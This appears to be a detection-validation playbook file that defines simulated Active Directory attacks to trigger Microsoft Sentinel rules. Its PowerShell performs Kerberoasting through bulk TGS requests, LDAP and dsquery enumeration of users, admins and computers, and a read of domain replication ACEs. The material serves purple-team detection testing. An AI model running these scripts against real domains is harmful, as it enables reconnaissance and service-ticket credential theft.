Per D-03 and RESEARCH.md: Sentinel-optimized Kerberoasting variant. Must differ from T1558.003 by targeting volume threshold (15+ SPN requests to cross Sentinel rule threshold). Key: generates EID 4769 on DC.

```yaml
id: AZURE_kerberoasting
name: Sentinel - Potential Kerberoasting Detection
description: >
  Sentinel-optimized Kerberoasting variant. Enumerates ALL SPN-registered service
  accounts and requests TGS tickets for each, crossing the Sentinel "Potential
  Kerberoasting" rule threshold (15+ distinct SPNs in 1 hour). Unlike T1558.003
  which requests a few tickets, this variant maximizes volume to trigger the
  Sentinel KQL-based analytic rule. Generates EID 4769 (KerbTicket TGS request
  with EncryptionType=0x17 RC4-HMAC) on the Domain Controller. Zero Azure
  connectivity required — Sentinel AMA/MMA agent forwards Security events.
tactic: credential-access
technique_id: T1558.003
platform: windows
phase: attack
elevation_required: false
expected_events:
  - event_id: 4769
    channel: "Security"
    description: "Kerberos TGS request - TicketEncryptionType=0x17 RC4-HMAC — Sentinel Potential Kerberoasting trigger"
  - event_id: 4688
    channel: "Security"
    description: "setspn.exe SPN enumeration process creation"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock - KerberosRequestorSecurityToken bulk requests"
tags:
  - credential-access
  - active-directory
  - sentinel-targeted
siem_coverage:
  sentinel:
    - "Potential Kerberoasting"
executor:
  type: powershell
  command: |-
    Write-Host "[AZURE_kerberoasting] Sentinel Kerberoasting Detection — Volume Threshold Trigger"
    Write-Host "Targets Sentinel 'Potential Kerberoasting' rule (15+ distinct SPN requests in 1h)"

    # Phase 1: Broad SPN enumeration — all service accounts
    Write-Host "--- Phase 1: Broad SPN enumeration (all service accounts) ---"
    Add-Type -AssemblyName System.IdentityModel
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.AddRange(@("servicePrincipalName","sAMAccountName"))
    $results = $searcher.FindAll()
    Write-Host "SPN-enabled service accounts found: $($results.Count)"

    # Phase 2: Request TGS for EACH SPN — volume to cross Sentinel threshold
    Write-Host "--- Phase 2: Bulk TGS requests (EID 4769 on DC per request) ---"
    $spns = @()
    foreach ($r in $results) {
        foreach ($spn in $r.Properties["serviceprincipalname"]) {
            $spns += $spn
        }
    }
    # Add machine SPNs as fallback for environments with few service accounts
    $spns += "HOST/$env:COMPUTERNAME"
    $spns += "HOST/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
    $spns += "CIFS/$env:COMPUTERNAME"
    $spns += "CIFS/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
    $spns += "HTTP/$env:COMPUTERNAME"
    $spns += "WSMAN/$env:COMPUTERNAME"
    $spns += "RestrictedKrbHost/$env:COMPUTERNAME"
    $spns += "TERMSRV/$env:COMPUTERNAME"
    $spns += "LDAP/$env:COMPUTERNAME"
    $spns += "DNS/$env:COMPUTERNAME"

    $requested = 0
    foreach ($spn in ($spns | Select-Object -Unique)) {
        try {
            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            $requested++
            Write-Host "  TGS #$requested for: $spn"
        } catch { }
    }
    Write-Host "Total TGS tickets requested: $requested (Sentinel threshold: 15)"

    # Phase 3: setspn.exe enumeration (EID 4688)
    Write-Host "--- Phase 3: setspn.exe enumeration (EID 4688) ---"
    setspn.exe -T $env:USERDNSDOMAIN -Q */* 2>&1 | Select-Object -First 10 | Write-Host

    # Phase 4: klist verification
    Write-Host "--- Phase 4: klist — acquired tickets ---"
    klist 2>&1 | Select-String "Service Name|Encryption Type" | Write-Host

    Write-Host "[AZURE_kerberoasting] Complete. $requested TGS requests sent. Check EID 4769 EncryptionType=0x17."
cleanup: ""
```

```yaml
id: AZURE_ldap_recon
name: Sentinel - LDAP Directory Reconnaissance
description: >
  LDAP directory enumeration targeting Active Directory. Uses DirectorySearcher
  with broad filters and tool-based exports (ldifde, dsquery) to simulate
  attacker reconnaissance. Primary events: EID 4688 (LDAP tool process creation)
  and EID 4104 (PowerShell ScriptBlock). Secondary: EID 1644 (expensive LDAP query)
  fires only if NTDS diagnostic logging is configured on the DC
  (HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics value 15 >= 5).
  Sentinel coverage is via community hunting queries — no dedicated built-in
  SecurityEvent analytic rule for EID 1644 exists. MDI handles LDAP recon via
  IdentityQueryEvents table. Zero Azure connectivity required.
tactic: discovery
technique_id: T1087.002
platform: windows
phase: attack
elevation_required: false
expected_events:
  - event_id: 4688
    channel: "Security"
    description: "ldifde.exe / dsquery.exe process creation — LDAP tool execution"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock - DirectorySearcher LDAP enumeration"
  - event_id: 4662
    channel: "Security"
    description: "DS object access — directory read operations during enumeration"
tags:
  - discovery
  - active-directory
  - sentinel-targeted
siem_coverage:
  sentinel:
    - "Anomalous LDAP Activity"  # MEDIUM confidence — community hunting query, not built-in Sentinel rule. Verify in portal.
executor:
  type: powershell
  command: |-
    Write-Host "[AZURE_ldap_recon] LDAP Directory Reconnaissance — Sentinel Detection"
    Write-Host "Targets AD enumeration patterns visible to Sentinel via SecurityEvent table"

    # Method 1: Broad DirectorySearcher — expensive query (EID 1644 on DC if diagnostics enabled)
    Write-Host "--- Method 1: Broad DirectorySearcher (objectClass=*) ---"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(objectClass=*)"
    $searcher.PageSize = 0
    $searcher.SizeLimit = 1000
    try {
        $count = ($searcher.FindAll()).Count
        Write-Host "Broad LDAP query returned $count objects (EID 1644 fires if NTDS diagnostic logging >= 5)"
    } catch { Write-Host "Broad query: $_" }

    # Method 2: User enumeration with attributes (EID 4104)
    Write-Host "--- Method 2: User attribute enumeration ---"
    $userSearcher = New-Object System.DirectoryServices.DirectorySearcher
    $userSearcher.Filter = "(&(objectClass=user)(objectCategory=person))"
    $userSearcher.PropertiesToLoad.AddRange(@("sAMAccountName","memberOf","adminCount","lastLogon","pwdLastSet"))
    $userSearcher.SizeLimit = 100
    try {
        $users = $userSearcher.FindAll()
        Write-Host "User objects found: $($users.Count)"
        $users | Select-Object -First 5 | ForEach-Object {
            $sam = $_.Properties["samaccountname"]
            $admin = $_.Properties["admincount"]
            Write-Host "  User: $sam (adminCount: $admin)"
        }
    } catch { Write-Host "User enum: $_" }

    # Method 3: ldifde export (EID 4688 for ldifde.exe)
    Write-Host "--- Method 3: ldifde LDAP export (EID 4688) ---"
    $ldifPath = "$env:TEMP\lognojutsu_ldap_export.ldf"
    ldifde -f $ldifPath -r "(objectClass=user)" -l "sAMAccountName,memberOf" -p subtree 2>&1 | Write-Host
    if (Test-Path $ldifPath) {
        $lines = (Get-Content $ldifPath | Measure-Object).Count
        Write-Host "LDIF export: $lines lines"
        Remove-Item $ldifPath -Force
    }

    # Method 4: dsquery for privileged accounts (EID 4688 for dsquery.exe)
    Write-Host "--- Method 4: dsquery privileged accounts (EID 4688) ---"
    dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName description 2>&1 | Select-Object -First 10 | Write-Host

    # Method 5: Computer enumeration
    Write-Host "--- Method 5: Computer object enumeration ---"
    $compSearcher = New-Object System.DirectoryServices.DirectorySearcher
    $compSearcher.Filter = "(objectClass=computer)"
    $compSearcher.PropertiesToLoad.AddRange(@("cn","operatingSystem","dNSHostName"))
    $compSearcher.SizeLimit = 50
    try {
        $comps = $compSearcher.FindAll()
        Write-Host "Computer objects: $($comps.Count)"
    } catch { Write-Host "Computer enum: $_" }

    Write-Host "[AZURE_ldap_recon] Complete. Check EID 4688 (ldifde/dsquery), EID 4104 (ScriptBlock)."
cleanup: |-
  Remove-Item "$env:TEMP\lognojutsu_ldap_export.ldf" -ErrorAction SilentlyContinue
  Write-Host "Cleanup: LDIF export removed."
```

**3. internal/playbooks/embedded/techniques/AZURE_dcsync.yaml**

Per D-03 and RESEARCH.md: Focus on DS-Replication GUID access via LDAP to generate EID 4662. Must differ from T1003.006 which uses repadmin /syncall.

```yaml
id: AZURE_dcsync
name: Sentinel - Potential DCSync Replication Access
description: >
  Sentinel-optimized DCSync simulation. Focuses on LDAP access to domain
  object's DS-Replication extended rights (GUIDs 1131f6aa, 1131f6ad) to generate
  EID 4662 — the primary event the Sentinel "Non Domain Controller Active
  Directory Replication" rule queries. Unlike T1003.006 which uses repadmin
  /syncall, this variant uses direct LDAP ACL access and DS-Replication attribute
  enumeration to trigger the specific EID 4662 pattern Sentinel correlates.
  Zero Azure connectivity required — generates local Windows Security Events.
tactic: credential-access
technique_id: T1003.006
platform: windows
phase: attack
elevation_required: false
expected_events:
  - event_id: 4662
    channel: "Security"
    description: "DS object access - Properties contain DS-Replication-Get-Changes GUIDs (1131f6aa, 1131f6ad)"
  - event_id: 4688
    channel: "Security"
    description: "PowerShell process creation for LDAP replication queries"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock - DS-Replication GUID enumeration"
tags:
  - credential-access
  - active-directory
  - sentinel-targeted
siem_coverage:
  sentinel:
    # Official Sentinel rule: "Non Domain Controller Active Directory Replication"
    # Source: Azure/Azure-Sentinel GitHub — NonDCActiveDirectoryReplication.yaml
    - "Non Domain Controller Active Directory Replication"
executor:
  type: powershell
  command: |-
    Write-Host "[AZURE_dcsync] Sentinel DCSync Detection — Replication Rights Enumeration"
    Write-Host "Targets Sentinel 'Non Domain Controller Active Directory Replication' rule"

    # DS-Replication extended right GUIDs (canonical DCSync indicators)
    $replGetChanges    = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    $replGetChangesAll = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    Write-Host "DS-Replication-Get-Changes GUID: $replGetChanges"
    Write-Host "DS-Replication-Get-Changes-All GUID: $replGetChangesAll"

    # Method 1: Domain object ACL access — check for replication extended rights
    # This LDAP access triggers EID 4662 on the DC with the replication GUIDs
    Write-Host "--- Method 1: Domain object ACL — DS-Replication rights check ---"
    try {
        $root = [ADSI]"LDAP://RootDSE"
        $domainDN = $root.defaultNamingContext
        Write-Host "Domain DN: $domainDN"
        $domainObj = [ADSI]"LDAP://$domainDN"
        $acl = $domainObj.ObjectSecurity
        $replAces = $acl.Access | Where-Object {
            $_.ObjectType -eq $replGetChanges -or $_.ObjectType -eq $replGetChangesAll
        }
        Write-Host "DS-Replication ACEs found: $($replAces.Count)"
        $replAces | ForEach-Object {
            Write-Host "  Identity: $($_.IdentityReference) Right: $($_.ActiveDirectoryRights) GUID: $($_.ObjectType)"
        }
    } catch { Write-Host "ACL check: $_" }

    # Method 2: Enumerate all ExtendedRight ACEs on domain object
    Write-Host "--- Method 2: All ExtendedRight ACEs on domain root ---"
    try {
        $extRights = $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" }
        Write-Host "Total ExtendedRight ACEs: $($extRights.Count)"
        $extRights | Select-Object -First 10 | ForEach-Object {
            Write-Host "  $($_.IdentityReference) -> $($_.ObjectType)"
        }
    } catch { Write-Host "ExtendedRight enum: $_" }

    # Method 3: Query replication metadata via LDAP
    Write-Host "--- Method 3: Replication metadata query ---"
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.Filter = "(objectClass=domain)"
        $searcher.PropertiesToLoad.AddRange(@("msDS-ReplAttributeMetaData","msDS-ReplValueMetaData","whenChanged"))
        $domResult = $searcher.FindOne()
        if ($domResult) {
            Write-Host "Domain replication metadata accessed (EID 4662 on DC)"
            $whenChanged = $domResult.Properties["whenchanged"]
            Write-Host "  Domain lastChanged: $whenChanged"
        }
    } catch { Write-Host "Repl metadata: $_" }

    # Method 4: nltest DC enumeration (supporting reconnaissance)
    Write-Host "--- Method 4: nltest DC enumeration ---"
    nltest /dclist:$env:USERDOMAIN 2>&1 | Write-Host

    Write-Host "[AZURE_dcsync] Complete. Check EID 4662 with GUIDs 1131f6aa/1131f6ad on DC."
cleanup: ""
```
